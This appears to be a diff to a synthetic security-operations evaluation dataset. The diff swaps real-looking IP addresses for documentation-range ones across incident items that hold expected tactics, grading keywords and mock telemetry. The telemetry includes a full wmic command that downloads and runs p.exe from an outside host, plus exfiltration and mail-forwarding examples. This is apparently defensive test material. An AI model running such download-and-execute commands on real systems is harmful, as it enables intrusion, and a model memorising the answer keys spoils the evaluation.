-        "CommandLine": "wmic /node:MAC-LEGAL-LAPTOP process call create \"cmd /c curl http://91.134.231.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
+        "CommandLine": "wmic /node:MAC-LEGAL-LAPTOP process call create \"cmd /c curl http://192.0.2.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
       }
     ]
   },
@@ -6568,7 +6568,7 @@
     "template_id": "s3-exfil-cloud-storage",
     "template_index": 33,
     "title": "Cloud storage exfil: data egress to attacker-controlled S3 from WIN-PROD-WEB02",
-    "description": "Egress from WIN-PROD-WEB02 to s3://atk-stage-185.220.101.7/dump/ by ops-lead@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
+    "description": "Egress from WIN-PROD-WEB02 to s3://atk-stage-198.51.100.7/dump/ by ops-lead@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
     "expected_tactics": [
       "TA0010"
     ],
@@ -6583,7 +6583,7 @@
       "egress",
       "exfiltrat",
       "WIN-PROD-WEB02",
-      "185.220.101.7",
+      "198.51.100.7",
       "ops-lead@example.com"
     ],
     "telemetry": [
@@ -6598,12 +6598,12 @@
         },
         "sourceIPAddress": "WIN-PROD-WEB02",
         "requestParameters": {
-          "bucketName": "atk-stage-185.220.101.7",
+          "bucketName": "atk-stage-198.51.100.7",
           "key": "dump/customers.tar.gz"
         },
         "resources": [
           {
-            "ARN": "arn:aws:s3:::atk-stage-185.220.101.7/dump/customers.tar.gz"
+            "ARN": "arn:aws:s3:::atk-stage-198.51.100.7/dump/customers.tar.gz"
           }
         ]
       }
@@ -6652,7 +6652,7 @@
     "template_id": "dga-c2",
     "template_index": 35,
     "title": "DGA-based C2 traffic from GCP-GKE-NODE-04",
-    "description": "DGA traffic from GCP-GKE-NODE-04 observed; 200+ NXDomain replies/min, IoCs match Scattered Spider epoch 5. Beacons to 45.142.122.111.",
+    "description": "DGA traffic from GCP-GKE-NODE-04 observed; 200+ NXDomain replies/min, IoCs match Scattered Spider epoch 5. Beacons to 203.0.113.111.",
     "expected_tactics": [
       "TA0011"
     ],
@@ -6667,7 +6667,7 @@
       "nxdomain",
       "beacon",
       "GCP-GKE-NODE-04",
-      "45.142.122.111",
+      "203.0.113.111",
       "Scattered Spider"
     ],
     "telemetry": [
@@ -6686,7 +6686,7 @@
         "EventID": 3,
         "Computer": "GCP-GKE-NODE-04",
         "Image": "C:\\Windows\\System32\\svchost.exe",
-        "DestinationIp": "45.142.122.111",
+        "DestinationIp": "203.0.113.111",
         "DestinationPort": 443,
         "Protocol": "tcp",
         "threat_actor": "Scattered Spider"
@@ -6866,7 +6866,7 @@
     "template_id": "public-s3-bucket-pii",
     "template_index": 40,
     "title": "Public S3 bucket exposing PII",
-    "description": "S3 bucket world-readable; ~40k employee records accessible. CloudTrail shows external enumeration from 91.134.231.15.",
+    "description": "S3 bucket world-readable; ~40k employee records accessible. CloudTrail shows external enumeration from 192.0.2.15.",
     "expected_tactics": [
       "TA0009",
       "TA0010"
@@ -6882,7 +6882,7 @@
       "public bucket",
       "pii",
       "cloudtrail",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
@@ -6911,7 +6911,7 @@
         "eventName": "ListObjectsV2",
         "eventSource": "s3.amazonaws.com",
         "awsRegion": "us-east-1",
-        "sourceIPAddress": "91.134.231.15",
+        "sourceIPAddress": "192.0.2.15",
         "requestParameters": {
           "bucketName": "aisoc-employees",
           "max-keys": 1000
@@ -6927,7 +6927,7 @@
     "template_id": "azure-ad-impossible-travel",
     "template_index": 41,
     "title": "Identity provider compromise \u2014 anomalous Azure AD sign-in for carol@example.com",
-    "description": "Successful Azure AD sign-in for carol@example.com from 91.134.231.15 (impossible-travel from prior location). MFA satisfied via stolen session token.",
+    "description": "Successful Azure AD sign-in for carol@example.com from 192.0.2.15 (impossible-travel from prior location). MFA satisfied via stolen session token.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -6944,14 +6944,14 @@
       "session token",
       "mfa",
       "carol@example.com",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
         "source": "azure_signin",
         "category": "SignInLogs",
         "userPrincipalName": "carol@example.com",
-        "ipAddress": "91.134.231.15",
+        "ipAddress": "192.0.2.15",
         "location": {
           "city": "Vladivostok",
           "countryOrRegion": "RU"
@@ -7048,7 +7048,7 @@
     "template_id": "office-vsto-addin",
     "template_index": 44,
     "title": "Malicious Office add-in installed for carol@example.com",
-    "description": "Office VSTO add-in registered under HKCU for carol@example.com on WIN-DC-SECONDARY; loads on every Outlook startup; beacons to 45.142.122.111.",
+    "description": "Office VSTO add-in registered under HKCU for carol@example.com on WIN-DC-SECONDARY; loads on every Outlook startup; beacons to 203.0.113.111.",
     "expected_tactics": [
       "TA0003",
       "TA0011"
@@ -7065,7 +7065,7 @@
       "outlook",
       "carol@example.com",
       "WIN-DC-SECONDARY",
-      "45.142.122.111"
+      "203.0.113.111"
     ],
     "telemetry": [
       {
@@ -7086,7 +7086,7 @@
         "EventID": 3,
         "Computer": "WIN-DC-SECONDARY",
         "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
-        "DestinationIp": "45.142.122.111",
+        "DestinationIp": "203.0.113.111",
         "DestinationPort": 443
       }
     ]
@@ -7095,8 +7095,8 @@
     "id": "INC-EVAL-156",
     "template_id": "github-pat-leak",
     "template_index": 45,
-    "title": "GitHub PAT leaked and abused from 45.142.122.111",
-    "description": "Personal access token belonging to dave@example.com used from 45.142.122.111 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
+    "title": "GitHub PAT leaked and abused from 203.0.113.111",
+    "description": "Personal access token belonging to dave@example.com used from 203.0.113.111 to clone 14 private repos. Token committed in public dotfiles repo 6 hours earlier.",
     "expected_tactics": [
       "TA0006",
       "TA0009"
@@ -7113,14 +7113,14 @@
       "token",
       "private repo",
       "dave@example.com",
-      "45.142.122.111"
+      "203.0.113.111"
     ],
     "telemetry": [
       {
         "source": "github_audit",
         "action": "git.clone",
         "actor": "dave@example.com",
-        "actor_ip": "45.142.122.111",
+        "actor_ip": "203.0.113.111",
         "repo_count": 14,
         "programmatic_access_type": "personal_access_token",
         "user_agent": "git/2.40.0"
@@ -7141,7 +7141,7 @@
     "template_id": "ec2-imds-credential-theft",
     "template_index": 46,
     "title": "EC2 instance metadata service abused on WIN-PROD-WEB02",
-    "description": "IMDSv1 abused on WIN-PROD-WEB02; temporary IAM credentials for role exfilled to 91.134.231.15. CloudTrail shows AssumeRole from external.",
+    "description": "IMDSv1 abused on WIN-PROD-WEB02; temporary IAM credentials for role exfilled to 192.0.2.15. CloudTrail shows AssumeRole from external.",
     "expected_tactics": [
       "TA0006",
       "TA0004"
@@ -7158,7 +7158,7 @@
       "iam credentials",
       "AssumeRole",
       "WIN-PROD-WEB02",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
@@ -7174,7 +7174,7 @@
         "eventName": "AssumeRole",
         "eventSource": "sts.amazonaws.com",
         "awsRegion": "us-east-1",
-        "sourceIPAddress": "91.134.231.15",
+        "sourceIPAddress": "192.0.2.15",
         "userIdentity": {
           "type": "AssumedRole",
           "principalId": "AIDA:role-app",
@@ -7189,7 +7189,7 @@
     "template_id": "helpdesk-password-reset-abuse",
     "template_index": 47,
     "title": "Vendor admin password reset abuse for frank@example.com",
-    "description": "Password reset for frank@example.com performed by helpdesk in response to social-engineering call from 91.134.231.15. Token claimed within 90 seconds.",
+    "description": "Password reset for frank@example.com performed by helpdesk in response to social-engineering call from 192.0.2.15. Token claimed within 90 seconds.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -7205,7 +7205,7 @@
       "social engineering",
       "helpdesk",
       "frank@example.com",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
@@ -7220,7 +7220,7 @@
         "source": "azure_signin",
         "category": "SignInLogs",
         "userPrincipalName": "frank@example.com",
-        "ipAddress": "91.134.231.15",
+        "ipAddress": "192.0.2.15",
         "resultType": 0,
         "seconds_after_reset": 87
       }
@@ -7323,7 +7323,7 @@
     "template_id": "outlook-auto-forward-rule",
     "template_index": 50,
     "title": "Outlook rule auto-forwarding mail from carol@example.com",
-    "description": "Outlook inbox rule created for carol@example.com that forwards all mail to external address at 185.220.101.7. Linked to LockBit 3.0.",
+    "description": "Outlook inbox rule created for carol@example.com that forwards all mail to external address at 198.51.100.7. Linked to LockBit 3.0.",
     "expected_tactics": [
       "TA0006",
       "TA0009"
@@ -7339,7 +7339,7 @@
       "forward",
       "mail",
       "carol@example.com",
-      "185.220.101.7",
+      "198.51.100.7",
       "LockBit 3.0"
     ],
     "telemetry": [
@@ -7350,7 +7350,7 @@
         "UserId": "carol@example.com",
         "Parameters": {
           "Name": "Sync",
-          "ForwardTo": "ext@185.220.101.7",
+          "ForwardTo": "ext@198.51.100.7",
           "DeleteMessage": true,
           "MarkAsRead": true
         },
@@ -7678,7 +7678,7 @@
     "template_id": "npm-supply-chain",
     "template_index": 3,
     "title": "Supply-chain compromise: malicious npm package on WIN-PROD-WEB02",
-    "description": "CI pipeline on WIN-PROD-WEB02 installed compromised npm package `event-stream`. Post-install hook executed reverse shell to 91.134.231.15. Build artefacts may be tainted.",
+    "description": "CI pipeline on WIN-PROD-WEB02 installed compromised npm package `event-stream`. Post-install hook executed reverse shell to 192.0.2.15. Build artefacts may be tainted.",
     "expected_tactics": [
       "TA0001",
       "TA0002"
@@ -7695,7 +7695,7 @@
       "event-stream",
       "post-install",
       "WIN-PROD-WEB02",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
@@ -7723,7 +7723,7 @@
         "severity": "high",
         "Computer": "WIN-PROD-WEB02",
         "User": "ci-runner",
-        "dest_ip": "91.134.231.15",
+        "dest_ip": "192.0.2.15",
         "dest_port": 4444
       }
     ]
@@ -7781,7 +7781,7 @@
     "template_id": "oauth-consent-phish",
     "template_index": 5,
     "title": "OAuth consent phishing targeting ceo@example.com",
-    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by ceo@example.com. Inbox forwarding rule created sending mail to 45.142.122.111.",
+    "description": "Malicious OAuth application granted Mail.Read and Files.Read.All scopes by ceo@example.com. Inbox forwarding rule created sending mail to 203.0.113.111.",
     "expected_tactics": [
       "TA0001",
       "TA0006"
@@ -7797,7 +7797,7 @@
       "Mail.Read",
       "Files.Read.All",
       "ceo@example.com",
-      "45.142.122.111",
+      "203.0.113.111",
       "forwarding rule"
     ],
     "telemetry": [
@@ -7820,7 +7820,7 @@
         "UserId": "ceo@example.com",
         "Parameters": {
           "Name": "Auto-fwd",
-          "ForwardTo": "ext@45.142.122.111",
+          "ForwardTo": "ext@203.0.113.111",
           "DeleteMessage": true
         }
       }
@@ -8925,7 +8925,7 @@
     "template_id": "wmi-lateral-execution",
     "template_index": 29,
     "title": "WMI lateral execution from WIN-FILE-SHARE to LIN-DB-REPLICA",
-    "description": "wmic.exe /node:LIN-DB-REPLICA process call create observed from WIN-FILE-SHARE by svc-backup@example.com. Remote command execution; payload from 91.134.231.15.",
+    "description": "wmic.exe /node:LIN-DB-REPLICA process call create observed from WIN-FILE-SHARE by svc-backup@example.com. Remote command execution; payload from 192.0.2.15.",
     "expected_tactics": [
       "TA0008",
       "TA0002"
@@ -8941,7 +8941,7 @@
       "WIN-FILE-SHARE",
       "LIN-DB-REPLICA",
       "svc-backup@example.com",
-      "91.134.231.15"
+      "192.0.2.15"
     ],
     "telemetry": [
       {
@@ -8952,7 +8952,7 @@
         "Computer": "WIN-FILE-SHARE",
         "User": "svc-backup@example.com",
         "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
-        "CommandLine": "wmic /node:LIN-DB-REPLICA process call create \"cmd /c curl http://91.134.231.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
+        "CommandLine": "wmic /node:LIN-DB-REPLICA process call create \"cmd /c curl http://192.0.2.15/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\""
       }
     ]
   },
@@ -9077,7 +9077,7 @@
     "template_id": "s3-exfil-cloud-storage",
     "template_index": 33,
     "title": "Cloud storage exfil: data egress to attacker-controlled S3 from K8S-PROD-CLUSTER",
-    "description": "Egress from K8S-PROD-CLUSTER to s3://atk-stage-45.142.122.111/dump/ by alice@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
+    "description": "Egress from K8S-PROD-CLUSTER to s3://atk-stage-203.0.113.111/dump/ by alice@example.com. 8 GB transferred over 20 minutes. CloudTrail PutObject events match.",
     "expected_tactics": [
       "TA0010"
     ],
@@ -9092,7 +9092,7 @@
       "egress",
       "exfiltrat",
       "K8S-PROD-CLUSTER",
-      "45.142.122.111",
+      "203.0.113.111",
       "alice@example.com"
     ],
     "telemetry": [
@@ -9107,12 +9107,12 @@
         },
         "sourceIPAddress": "K8S-PROD-CLUSTER",
         "requestParameters": {
-          "bucketName": "atk-stage-45.142.122.111",
+          "bucketName": "atk-stage-203.0.113.111",
           "key": "dump/customers.tar.gz"
         },
         "resources": [
           {
-            "ARN": "arn:aws:s3:::atk-stage-45.142.122.111/dump/customers.tar.gz"
+            "ARN": "arn:aws:s3:::atk-stage-203.0.113.111/dump/customers.tar.gz"
           }
         ]
       }
